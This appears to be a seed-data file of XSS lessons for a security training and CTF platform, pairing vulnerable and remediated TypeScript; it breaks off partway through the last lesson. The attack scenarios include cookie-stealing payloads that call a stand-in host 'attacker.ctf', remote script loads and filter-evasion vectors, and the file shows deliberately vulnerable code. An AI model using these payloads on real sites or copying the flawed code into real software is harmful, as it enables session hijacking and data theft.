import { ChallengeDifficulty, ChallengeStatus } from '@prisma/client';
import { LessonSeedData } from './auth-lessons';

export const XSS_LESSONS: LessonSeedData[] = [
  // -------------------------------------------------------------------------
  // 21. Reflected XSS Basic
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'reflected-xss-basic-alert',
    title: 'Reflected Cross-Site Scripting (XSS): Anatomy of Untrusted Reflection',
    slug: 'reflected-xss-basic-guide',
    description: 'Understand how unencoded user inputs reflected directly in HTTP responses execute arbitrary JavaScript in the victim\'s browser.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 6.1,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Reflected Cross-Site Scripting (XSS) occurs when an application receives untrusted data in an HTTP request (typically via URL query parameters or form submissions) and includes that data immediately in the immediate response page without proper context-aware HTML encoding. When a victim clicks a crafted link, the injected script executes within the victim\'s browser session.',
    rootCause: 'The server directly embeds untrusted request parameters into HTML templates or response streams without applying HTML entity encoding (`&lt;`, `&gt;`, `&quot;`, `&#39;`).',
    mechanics: '1. Crafting: Attacker crafts a URL: `https://ctf.websec.internal/search?q=<script>alert(1)</script>`.\n2. Delivery: Attacker sends the link to a victim or submits it into a search form.\n3. Server Reflection: The server outputs `<h1>Search results for: <script>alert(1)</script></h1>`.\n4. Browser Parsing: The victim\'s browser parses the `<script>` tag as executable code rather than text, executing the attacker\'s JavaScript.',
    attackScenario: 'GET /search?q=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fattacker.ctf%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1\nHost: ctf.websec.internal\n\nResponse:\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<body>\n  <h1>Search results for: <script>document.location="http://attacker.ctf/steal?c="+document.cookie</script></h1>\n  <!-- Flag revealed upon exploit execution: WEBSEC{basic_reflected_xss_alert_executed} -->\n</body>',
    securityImpact: 'Session hijacking via cookie theft, credential theft, redirection to phishing portals, and actions performed on behalf of the victim.',
    prevention: '1. Context-aware HTML entity encoding on all reflected user inputs.\n2. Use modern frontend frameworks (React, Angular, Vue) that encode text interpolations by default.\n3. Set `HttpOnly` flag on sensitive cookies to prevent JavaScript access.\n4. Deploy a strong Content Security Policy (CSP).',
    vulnerableCode: `// Vulnerable: Directly renders unencoded query string into HTML
app.get('/search', (req, res) => {
  const query = req.query.q || '';
  // Dangerous: String interpolation into HTML response
  res.send(\`<div><h1>Search results for: \${query}</h1></div>\`);
});`,
    secureCode: `// Remediated: HTML-encodes user data before rendering
import escapeHtml from 'escape-html';

app.get('/search', (req, res) => {
  const query = req.query.q ? String(req.query.q) : '';
  const safeQuery = escapeHtml(query); // Encodes <, >, &, ", '
  res.send(\`<div><h1>Search results for: \${safeQuery}</h1></div>\`);
});

// Or using React (automatic encoding by default):
// return <h1>Search results for: {query}</h1>;`,
    codeLanguage: 'typescript',
    realWorldExample: 'Major search engines and social networks have historically experienced reflected XSS bugs on error pages and search results, allowing phishing campaigns to target users under legitimate corporate domains.',
    references: [
      { title: 'OWASP Cross Site Scripting Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
      { title: 'CWE-79: Cross-site Scripting', url: 'https://cwe.mitre.org/data/definitions/79.html' }
    ],
    keyTakeaways: '• Reflected XSS requires user interaction (clicking a link).\n• Modern frameworks like React escape text bindings automatically.\n• Always encode user input based on the destination context (HTML, attribute, JS).'
  },

  // -------------------------------------------------------------------------
  // 22. DOM-Based innerHTML Injection
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'dom-innerhtml-injection',
    title: 'DOM-Based XSS: Client-Side Sinks and innerHTML Manipulation',
    slug: 'dom-innerhtml-injection-guide',
    description: 'Learn how passing unsanitized client-side data (sources) to dangerous DOM sinks like innerHTML enables purely client-side script execution.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.BEGINNER,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 6.1,
    status: ChallengeStatus.PUBLISHED,
    overview: 'DOM-Based Cross-Site Scripting occurs entirely on the client side, where the client\'s JavaScript reads data from an untrusted "source" (such as `location.search`, `location.hash`, or `document.referrer`) and passes it into a dangerous execution "sink" (such as `element.innerHTML`, `document.write()`, or `eval()`). The payload never necessarily touches the server backend.',
    rootCause: 'Client-side scripts assigning untrusted string data to `innerHTML` instead of using safe text properties like `textContent` or `innerText`.',
    mechanics: '1. Source Extraction: Client JavaScript executes: `const name = new URLSearchParams(window.location.search).get("name");`.\n2. Dangerous Sink: Script assigns `document.getElementById("welcome").innerHTML = "Hello " + name;`.\n3. Injection Payload: Attacker crafts: `?name=<img src=x onerror=alert(1)>`.\n4. Browser Execution: The browser parses the `<img>` tag, fails to load resource `x`, triggers the `onerror` event handler, and executes JavaScript.',
    attackScenario: 'Target URL:\nhttps://ctf.websec.internal/welcome.html#name=<img src=x onerror="fetch(\'http://attacker.ctf/\'+document.cookie)">\n\nClient Script Executed:\nwelcomeElement.innerHTML = "Welcome " + location.hash.substring(6);\n\nResult:\nPayload triggers on load! Flag: WEBSEC{dom_innerhtml_sink_injection_success}',
    securityImpact: 'Client-side execution of arbitrary scripts, DOM manipulation, theft of local storage/session tokens, and credential harvesting.',
    prevention: '1. Use safe DOM manipulation properties: `element.textContent` or `element.innerText` instead of `innerHTML`.\n2. When rich HTML rendering is strictly necessary, sanitize input using libraries like DOMPurify.\n3. Adopt Trusted Types API to enforce compile-time sink safety.',
    vulnerableCode: `// Vulnerable: Client-side DOM manipulation using dangerous innerHTML sink
const urlParams = new URLSearchParams(window.location.search);
const userName = urlParams.get('user') || 'Guest';

// Dangerous Sink: Parses and executes any HTML/script in userName!
document.getElementById('greeting')!.innerHTML = 'Hello, ' + userName;`,
    secureCode: `// Remediated: Safe DOM manipulation using textContent
const urlParams = new URLSearchParams(window.location.search);
const userName = urlParams.get('user') || 'Guest';

// Safe: Treats string strictly as text, escaping any HTML entities automatically
document.getElementById('greeting')!.textContent = 'Hello, ' + userName;

// Or if HTML is required, sanitize with DOMPurify:
// import DOMPurify from 'dompurify';
// element.innerHTML = DOMPurify.sanitize(userProvidedHtml);`,
    codeLanguage: 'typescript',
    realWorldExample: 'Single-page web applications and dashboard widgets frequently introduce DOM XSS when parsing URL hash fragments (`#`) to dynamically render page headers or tab selections.',
    references: [
      { title: 'OWASP DOM Based XSS Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html' },
      { title: 'DOMPurify Library', url: 'https://github.com/cure53/DOMPurify' }
    ],
    keyTakeaways: '• DOM XSS occurs entirely within the browser DOM without server involvement.\n• Identify "sources" (e.g., location.hash) and avoid dangerous "sinks" (e.g., innerHTML).\n• Use textContent for text and DOMPurify for HTML.'
  },

  // -------------------------------------------------------------------------
  // 23. Stored Guestbook XSS
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'stored-guestbook-xss',
    title: 'Stored (Persistent) XSS: High-Impact Malicious Payload Persistence',
    slug: 'stored-guestbook-xss-guide',
    description: 'Explore the devastating impact of stored XSS where malicious scripts are permanently stored in databases and executed for every visiting user.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 8.2,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Stored Cross-Site Scripting (also known as Persistent or Second-Order XSS) is the most dangerous variant of XSS. The attacker injects malicious script into an application storage medium (database, forum post, guestbook, user profile, or comment system). Every time a user or administrator views the page containing the stored content, the malicious script automatically executes in their browser.',
    rootCause: 'The application stores untrusted user input directly in the database and renders it in HTML views without sanitization or context-aware encoding.',
    mechanics: '1. Submission: Attacker submits a comment containing `<script src="http://attacker.ctf/worm.js"></script>` or `<img src=x onerror=...>`. \n2. Persistence: The backend saves the comment directly into the database without sanitization.\n3. Execution: Whenever any visitor or site administrator visits `/guestbook`, the server renders the comment into the HTML response.\n4. Automated Trigger: The browser executes the payload automatically without requiring the victim to click any link.',
    attackScenario: 'POST /api/guestbook/comments HTTP/1.1\nContent-Type: application/json\n\n{\n  "author": "Attacker",\n  "message": "<script>fetch(\'/api/admin/flag\').then(r=>r.json()).then(d=>alert(d.flag))</script>"\n}\n\nOutcome: When the administrator loads the guestbook, the script fetches the administrative flag and alerts it: WEBSEC{stored_guestbook_xss_admin_compromise}',
    securityImpact: 'Mass account hijacking, self-propagating XSS worms, credential harvesting across all active users, and defacement.',
    prevention: '1. Output encoding: Encode all dynamic content before inserting into HTML views.\n2. Input sanitization: If rich text is allowed (e.g. Markdown/HTML), sanitize with DOMPurify on both backend and frontend.\n3. Content Security Policy: Disallow inline scripts (`\'unsafe-inline\'`) and restrict script origins.',
    vulnerableCode: `// Vulnerable: Renders database messages directly into raw HTML
app.get('/guestbook', async (req, res) => {
  const comments = await db.comment.findMany();
  let html = '<h1>Guestbook</h1>';
  for (const c of comments) {
    // Dangerous: Direct string interpolation of stored database records!
    html += \`<div class="comment"><b>\${c.author}</b>: \${c.message}</div>\`;
  }
  res.send(html);
});`,
    secureCode: `// Remediated: HTML-encodes output strings before rendering
import escapeHtml from 'escape-html';

app.get('/guestbook', async (req, res) => {
  const comments = await db.comment.findMany();
  let html = '<h1>Guestbook</h1>';
  for (const c of comments) {
    // Safe: Encodes special characters into safe HTML entities
    html += \`<div class="comment"><b>\${escapeHtml(c.author)}</b>: \${escapeHtml(c.message)}</div>\`;
  }
  res.send(html);
});`,
    codeLanguage: 'typescript',
    realWorldExample: 'The Samy Worm on MySpace in 2005 utilized stored XSS in user profile profiles to infect over 1 million users within 20 hours, becoming one of the fastest spreading computer viruses in history.',
    references: [
      { title: 'OWASP Stored XSS Testing', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting' },
      { title: 'CWE-79: Cross-site Scripting', url: 'https://cwe.mitre.org/data/definitions/79.html' }
    ],
    keyTakeaways: '• Stored XSS executes automatically for every user who views the page.\n• No phishing link or user click is required.\n• Robust output encoding and CSP are vital to stop stored XSS.'
  },

  // -------------------------------------------------------------------------
  // 24. Attribute-Based XSS Breakout
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'attribute-based-xss-breakout',
    title: 'Attribute-Based XSS: Breaking Out of HTML Attributes',
    slug: 'attribute-based-xss-guide',
    description: 'Learn how user input reflected inside HTML attributes (such as value, href, or title) can break out and introduce event handlers.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 6.1,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Attribute-Based XSS occurs when user input is placed inside an HTML attribute (e.g., `<input type="text" name="search" value="USER_INPUT">`). If the application only filters `<script>` tags but fails to encode quotation marks (`"` or `\'`), an attacker can close the attribute, add new attributes or event handlers (like `onfocus`, `onload`, `onmouseover`), and execute code without ever needing `<script>` tags.',
    rootCause: 'Developers filtered angle brackets (`<` and `>`) believing that prevented XSS, but failed to encode quotation marks (`"`, `\'`) inside attribute contexts.',
    mechanics: '1. Reflection Context: Input is reflected inside: `<input type="text" value="REFLECTED_HERE">`.\n2. Filter: Application strips `<` and `>`.\n3. Breakout Payload: Attacker injects `" onfocus="alert(1)" autofocus="`.\n4. Resulting HTML: `<input type="text" value="" onfocus="alert(1)" autofocus="">`.\n5. Execution: The `autofocus` attribute forces browser focus onto the input, immediately triggering `onfocus` and executing JavaScript.',
    attackScenario: 'GET /profile/edit?nickname=" onfocus="alert(document.domain)" autofocus=" HTTP/1.1\n\nRendered HTML in browser:\n<input type="text" name="nickname" value="" onfocus="alert(document.domain)" autofocus="">\n\nResult:\nInput automatically triggers alert! Flag: WEBSEC{attribute_breakout_event_handler_fired}',
    securityImpact: 'Execution of JavaScript in victim browser, bypassing superficial `<script>` tag filters.',
    prevention: '1. Use full HTML attribute encoding (encode quotes as `&quot;` and `&#39;`).\n2. Always enclose attribute values in double quotes (`"`).\n3. Use modern template engines that apply context-aware attribute escaping.',
    vulnerableCode: `// Vulnerable: Encodes angle brackets but leaves quotation marks raw in attribute
function renderInput(userValue: string) {
  // Flaw: Only replaces < and >, leaving double quotes unescaped!
  const sanitized = userValue.replace(/</g, '').replace(/>/g, '');
  return \`<input type="text" name="bio" value="\${sanitized}">\`;
}`,
    secureCode: `// Remediated: Complete attribute encoding including quotes
import escapeHtml from 'escape-html';

function renderInput(userValue: string) {
  // escapeHtml replaces &, <, >, ", and '
  const safeValue = escapeHtml(userValue);
  return \`<input type="text" name="bio" value="\${safeValue}">\`;
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'Search fields and profile forms frequently prefill current values inside `<input value="...">`, where attackers bypass WAFs that only monitor for `<script>` by injecting `" onmouseover="...`.',
    references: [
      { title: 'OWASP XSS Prevention - Rule #2 Attribute Context', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-2-attribute-escape-before-inserting-untrusted-data-into-html-common-attributes' },
      { title: 'CWE-79: Cross-site Scripting', url: 'https://cwe.mitre.org/data/definitions/79.html' }
    ],
    keyTakeaways: '• XSS does not require `<script>` tags.\n• Unencoded quotation marks allow breaking out of HTML attributes.\n• Always encode quotes (`&quot;`, `&#39;`) in attribute contexts.'
  },

  // -------------------------------------------------------------------------
  // 25. JavaScript URL Scheme XSS
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'javascript-url-scheme-xss',
    title: 'JavaScript Pseudo-Protocol (javascript:) URL Injection',
    slug: 'javascript-url-scheme-xss-guide',
    description: 'Learn how user-controlled URLs in href or src attributes allow script execution via the javascript: pseudo-protocol even when HTML is encoded.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.EASY,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 6.1,
    status: ChallengeStatus.PUBLISHED,
    overview: 'The `javascript:` pseudo-protocol allows browsers to interpret the remainder of a URL string as JavaScript code rather than a network destination. When an application accepts a user-provided URL (e.g., website URL, avatar URL, or back-link) and embeds it directly into an `<a href="...">` or `window.location`, HTML entity encoding does NOT prevent exploitation because browsers decode HTML entities before executing the URL protocol.',
    rootCause: 'The application validated that the input was a valid string and escaped HTML entities, but failed to validate the URL protocol against an allowlist of safe schemes (`http:`, `https:`, `mailto:`).',
    mechanics: '1. Form Submission: User sets website URL to `javascript:alert(document.cookie)`.\n2. Reflection: Application renders: `<a href="javascript:alert(document.cookie)">Visit Website</a>`.\n3. Victim Interaction: Victim clicks the link.\n4. Execution: The browser recognizes the `javascript:` scheme and executes the code within the origin context.',
    attackScenario: 'POST /api/user/website HTTP/1.1\nContent-Type: application/json\n\n{\n  "website": "javascript:fetch(\'/api/flag\').then(r=>r.json()).then(d=>alert(d.flag))"\n}\n\nRendered link:\n<a href="javascript:fetch(\'/api/flag\')...">Author Website</a>\n\nResult on click: Flag extracted: WEBSEC{javascript_pseudo_protocol_executed}',
    securityImpact: 'Arbitrary script execution upon user click, bypassing standard HTML entity encoding.',
    prevention: '1. Validate URL schemes against a strict whitelist: only allow `http:` and `https:`.\n2. Reject any URL starting with `javascript:`, `data:`, or `vbscript:`.\n3. Parse URLs using standard URL parsers (`new URL(url)`) before rendering.',
    vulnerableCode: `// Vulnerable: Validates URL as string and escapes HTML, but allows javascript: scheme
function renderWebsiteLink(url: string) {
  const safeUrl = escapeHtml(url);
  // Flaw: escapeHtml doesn't stop "javascript:alert(1)"!
  return \`<a href="\${safeUrl}">Visit Website</a>\`;
}`,
    secureCode: `// Remediated: Strict protocol whitelisting
function renderWebsiteLink(url: string): string {
  try {
    const parsed = new URL(url);
    // Explicit protocol allowlist
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return '<span>Invalid URL</span>';
    }
    return \`<a href="\${escapeHtml(parsed.href)}" target="_blank" rel="noopener noreferrer">Visit Website</a>\`;
  } catch {
    return '<span>Invalid URL</span>';
  }
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'Many blogging platforms and user profile bios allowed users to link their personal homepage, leading to one-click account takeover when profile visitors clicked malicious links.',
    references: [
      { title: 'OWASP XSS Prevention - Rule #3 JavaScript URL Context', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-3-javascript-escape-before-inserting-untrusted-data-into-javascript-data-values' },
      { title: 'CWE-79: Cross-site Scripting', url: 'https://cwe.mitre.org/data/definitions/79.html' }
    ],
    keyTakeaways: '• HTML entity encoding does not protect against `javascript:` URL schemes.\n• Always parse URLs and validate against a protocol allowlist (`http:`, `https:`).\n• Reject `javascript:` and `data:` schemes completely.'
  },

  // -------------------------------------------------------------------------
  // 26. Filter Evasion via Event Handlers
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'filter-evasion-event-handlers',
    title: 'XSS Filter Evasion via Rare HTML Tags and SVG Event Handlers',
    slug: 'filter-evasion-event-handlers-guide',
    description: 'Understand how attackers evade regex-based XSS filters using alternative HTML5 tags, SVG elements, and modern event handlers.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.MEDIUM,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 7.2,
    status: ChallengeStatus.PUBLISHED,
    overview: 'When developers implement custom regex filters to strip common tags like `<script>`, `<img>`, and `<iframe>`, or common handlers like `onload` and `onerror`, attackers utilize thousands of alternative HTML tags and event handlers. Modern browsers support `<svg onload>`, `<body onresize>`, `<details ontoggle>`, `<video><source onerror>`, and `<input autofocus onfocus>`.',
    rootCause: 'Relying on incomplete blacklist filters rather than comprehensive context encoding or verified HTML sanitization engines.',
    mechanics: '1. Filter Analysis: The filter strips `<script`, `<img`, `onerror`, `onload`.\n2. Alternative Vector: Attacker crafts: `<svg/onload=alert(1)>` or `<details open ontoggle=alert(1)>`.\n3. Filter Failure: The filter regex fails to match the `<svg>` or `<details>` tag.\n4. Execution: The browser parses the SVG or Details element and immediately fires the unblocked event handler.',
    attackScenario: 'Payload:\n<svg/onload=fetch(\'/api/flag\').then(r=>r.json()).then(d=>alert(d.flag))>\n\nRendered in DOM:\n<svg/onload=fetch(...)></svg>\n\nResult on page load: Alert fires: WEBSEC{filter_evasion_svg_event_handler_cleared}',
    securityImpact: 'Bypass of custom WAF or input sanitization, leading to full client-side code execution.',
    prevention: '1. Never write custom regex filters to sanitize HTML.\n2. Use DOMPurify for HTML sanitization: `DOMPurify.sanitize(input)`.\n3. Enforce Content Security Policy disabling inline scripts.',
    vulnerableCode: `// Vulnerable: Incomplete regex filter trying to blacklist script and img tags
function naiveSanitize(input: string): string {
  // Flaw: Misses <svg>, <details>, <video>, and dozens of event handlers!
  return input
    .replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '')
    .replace(/<img[^>]+onerror[^>]*>/gi, '');
}`,
    secureCode: `// Remediated: Industry-standard HTML sanitization using DOMPurify
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window as any);

function secureSanitize(dirtyHtml: string): string {
  // Strips all malicious tags, unknown attributes, and event handlers
  return purify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href', 'target'],
  });
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'OWASP and PortSwigger maintain cheat sheets listing over 200 distinct HTML tags and vector combinations capable of executing JavaScript across modern browser engines.',
    references: [
      { title: 'PortSwigger XSS Cheat Sheet', url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet' },
      { title: 'DOMPurify Security Rules', url: 'https://github.com/cure53/DOMPurify' }
    ],
    keyTakeaways: '• Custom regex filters cannot safely sanitize HTML.\n• There are hundreds of combinations of HTML5 tags and event handlers.\n• Use battle-tested sanitizers like DOMPurify with strict tag whitelists.'
  },

  // -------------------------------------------------------------------------
  // 27. DOM-Based document.write Injection
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'dom-document-write-injection',
    title: 'DOM XSS via Legacy document.write() and eval() Sinks',
    slug: 'dom-document-write-injection-guide',
    description: 'Learn how legacy client-side APIs like document.write dynamically compile untrusted strings into executable browser DOM structures.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.MEDIUM,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 7.1,
    status: ChallengeStatus.PUBLISHED,
    overview: '`document.write()` is a legacy browser API that directly injects raw markup into the document stream while the HTML document is being parsed. When client-side scripts pass URL parameters or referrer strings directly into `document.write()`, the browser parses the payload in real-time, executing any injected tags or scripts.',
    rootCause: 'Use of deprecated `document.write()` with unescaped URL parameters instead of modern, safe DOM APIs.',
    mechanics: '1. Source: Script reads `document.location.search`.\n2. Sink: Script executes: `document.write("<div class=\\"banner\\">Ad: " + param + "</div>")`.\n3. Payload: Attacker injects: `"><script>alert(1)</script>`.\n4. Execution: The input breaks out of the `<div>` tag and inserts the `<script>` element into the active parse stream.',
    attackScenario: 'URL:\nhttps://ctf.websec.internal/ad.html?partner="><script>fetch(\'/api/flag\').then(r=>r.json()).then(d=>alert(d.flag))</script>\n\nExecuted stream:\n<div class=\'banner\'>Ad: "><script>fetch(\'/api/flag\')...</script></div>\n\nResult: Flag extracted: WEBSEC{dom_document_write_sink_evaluated}',
    securityImpact: 'DOM-based code execution, ad hijacking, tracking injection, and session theft.',
    prevention: '1. Eliminate `document.write()` completely from modern codebases.\n2. Use safe element creation: `document.createElement()` and `element.textContent`.\n3. Deploy Trusted Types to disallow raw string writes.',
    vulnerableCode: `// Vulnerable: Legacy document.write writing URL parameters to page
const trackingId = new URLSearchParams(window.location.search).get('tid');
// Dangerous Sink: Directly compiles raw string into page markup
document.write('<span id="tracker">Tracking ID: ' + trackingId + '</span>');`,
    secureCode: `// Remediated: Safe DOM creation
const trackingId = new URLSearchParams(window.location.search).get('tid') || '';

const span = document.createElement('span');
span.id = 'tracker';
span.textContent = 'Tracking ID: ' + trackingId; // Safe text insertion
document.body.appendChild(span);`,
    codeLanguage: 'typescript',
    realWorldExample: 'Third-party advertising and analytics snippets from the early 2010s frequently used `document.write` to embed banners, creating widespread DOM XSS across major media websites.',
    references: [
      { title: 'Google Web Fundamentals: Don\'t use document.write()', url: 'https://developer.chrome.com/docs/lighthouse/best-practices/no-document-write/' },
      { title: 'CWE-79: Cross-site Scripting', url: 'https://cwe.mitre.org/data/definitions/79.html' }
    ],
    keyTakeaways: '• document.write() is inherently unsafe and deprecated.\n• Use document.createElement() and textContent instead.\n• Modern browser engines may block document.write() on slow networks.'
  },

  // -------------------------------------------------------------------------
  // 28. Blind XSS Admin Log Exfiltration
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'blind-xss-admin-log-exfiltration',
    title: 'Blind Cross-Site Scripting: Exploiting Internal Admin Review Consoles',
    slug: 'blind-xss-admin-log-guide',
    description: 'Master the principles of Blind XSS where payloads execute exclusively in private administrative dashboards and internal review panels.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.MEDIUM,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 8.5,
    status: ChallengeStatus.PUBLISHED,
    overview: 'Blind XSS is a specialized form of Stored XSS where the attacker submits a malicious payload into a public-facing feature (such as a support ticket, feedback form, user-agent log, or refund request), but the payload is only rendered inside a private, internal administrative dashboard that the attacker cannot see directly.',
    rootCause: 'Developers often secure customer-facing pages but assume that internal back-office applications and admin consoles do not require output encoding because "only internal staff view them".',
    mechanics: '1. Submission: Attacker submits a feedback ticket with: `<script src="https://attacker.ctf/xss.js"></script>`.\n2. Storage: The feedback is saved in the database.\n3. Blind Trigger: An administrator logs into the internal support console (`/admin/tickets`) hours later.\n4. Callback: The payload executes in the admin\'s browser, sending an out-of-band HTTP callback to the attacker\'s server containing the admin\'s session token and cookies.',
    attackScenario: 'Feedback message submitted:\n`<script>fetch(\'https://attacker.ctf/log?c=\'+document.cookie+\'&flag=\'+document.getElementById(\'admin-flag\').innerText)</script>`\n\nAttacker Server Callback received:\nGET /log?c=admin_jwt=...&flag=WEBSEC{blind_xss_admin_console_callback_success}\n\nOutcome: Admin session compromised from behind internal firewall.',
    securityImpact: 'Administrative session takeover, compromise of internal intranet applications, and lateral movement.',
    prevention: '1. Enforce strict output encoding and sanitization in ALL internal and administrative consoles.\n2. Disallow external script execution using strict Content Security Policy (`script-src \'self\'`).\n3. Use XSS Hunter or similar tools during authorized penetration testing to detect blind sinks.',
    vulnerableCode: `// Vulnerable: Internal admin support portal renders feedback unencoded
@Get('admin/tickets')
async viewTickets() {
  const tickets = await this.prisma.ticket.findMany();
  // Internal admin view assumes database input is trustworthy
  return tickets.map(t => \`<tr><td>\${t.id}</td><td>\${t.userMessage}</td></tr>\`);
}`,
    secureCode: `// Remediated: Encodes output in admin view
import escapeHtml from 'escape-html';

@Get('admin/tickets')
async viewTickets() {
  const tickets = await this.prisma.ticket.findMany();
  return tickets.map(t => ({
    id: t.id,
    userMessage: escapeHtml(t.userMessage),
  }));
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'Security researchers frequently find Blind XSS in corporate bug bounty programs by injecting XSS callbacks into shipping addresses, job application forms, and order special instructions.',
    references: [
      { title: 'OWASP Testing for Blind XSS', url: 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting' },
      { title: 'CWE-79: Cross-site Scripting', url: 'https://cwe.mitre.org/data/definitions/79.html' }
    ],
    keyTakeaways: '• Blind XSS executes in applications the attacker cannot directly access.\n• Internal portals require the exact same defensive standards as public pages.\n• Out-of-band callbacks are the primary method of verifying blind XSS.'
  },

  // -------------------------------------------------------------------------
  // 29. Markdown Parser Script Injection
  // -------------------------------------------------------------------------
  {
    challengeSlug: 'markdown-parser-script-injection',
    title: 'Markdown Parser XSS: Raw HTML Passthrough Flaws',
    slug: 'markdown-parser-script-injection-guide',
    description: 'Learn how Markdown-to-HTML libraries that allow raw HTML passthrough expose web applications to script injection.',
    category: 'cross-site-scripting',
    difficulty: ChallengeDifficulty.HARD,
    owaspReference: 'OWASP Top 10 A03:2021 – Injection',
    cweReference: 'CWE-79: Improper Neutralization of Input During Web Page Generation',
    cvssScore: 7.7,
    status: ChallengeStatus.PUBLISHED,
    overview: 'The CommonMark and standard Markdown specifications explicitly state that raw HTML embedded within Markdown text should be passed through into the generated HTML output. Many developer blogging platforms, documentation sites, and issue trackers render user-supplied Markdown. If the Markdown parser is configured with raw HTML passthrough enabled and lacks a secondary HTML sanitizer, attackers can embed malicious script tags directly inside Markdown posts.',
    rootCause: 'The markdown compiler parsed Markdown into HTML with raw HTML passthrough enabled, without piping the output through an HTML sanitization engine.',
    mechanics: '1. Form Submission: User submits markdown: `# My Title\nHere is normal text.\n<script>alert(1)</script>`.\n2. Compilation: The markdown library (e.g. `marked(text)`) transforms Markdown into HTML while preserving `<script>`.\n3. Output Rendering: The application outputs the compiled HTML directly.\n4. Execution: The browser runs the embedded script.',
    attackScenario: 'Post content:\n[Click Here](javascript:alert(1))\n\nOr using raw HTML in markdown:\n<img src=x onerror="fetch(\'/api/flag\').then(r=>r.json()).then(d=>alert(d.flag))">\n\nCompiled result:\n<img src=x onerror="...">\n\nResult: Flag revealed: WEBSEC{markdown_raw_html_passthrough_sanitized}',
    securityImpact: 'Persistent script execution within rich-text rendering features.',
    prevention: '1. Pipe all compiled Markdown output through DOMPurify: `DOMPurify.sanitize(marked.parse(markdown))`.\n2. Configure markdown parsers to disable raw HTML tags (e.g., `sanitize: true` or disallowing HTML tokens).\n3. Enforce strict link protocol verification.',
    vulnerableCode: `// Vulnerable: Compiles markdown and renders without HTML sanitization
import { marked } from 'marked';

app.post('/api/post', (req, res) => {
  const html = marked.parse(req.body.markdown);
  // Dangerous: marked passes through raw <script> and <img> tags!
  res.send(\`<div class="article">\${html}</div>\`);
});`,
    secureCode: `// Remediated: Pipes compiled markdown through DOMPurify
import { marked } from 'marked';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window as any);

app.post('/api/post', (req, res) => {
  const rawHtml = marked.parse(req.body.markdown);
  // Safe: Sanitizes compiled HTML, stripping all malicious tags
  const cleanHtml = purify.sanitize(rawHtml);
  res.send(\`<div class="article">\${cleanHtml}</div>\`);
});`,
    codeLanguage: 'typescript',
    realWorldExample: 'Major code hosting platforms and issue trackers have faced multiple high-severity vulnerabilities where custom markdown rendering extensions failed to sanitize nested tags or markdown links.',
    references: [
      { title: 'CommonMark Specification: Raw HTML', url: 'https://spec.commonmark.org/0.30/#raw-html' },
      { title: 'DOMPurify Security Documentation', url: 'https://github.com/cure53/DOMPurify' }
    ],
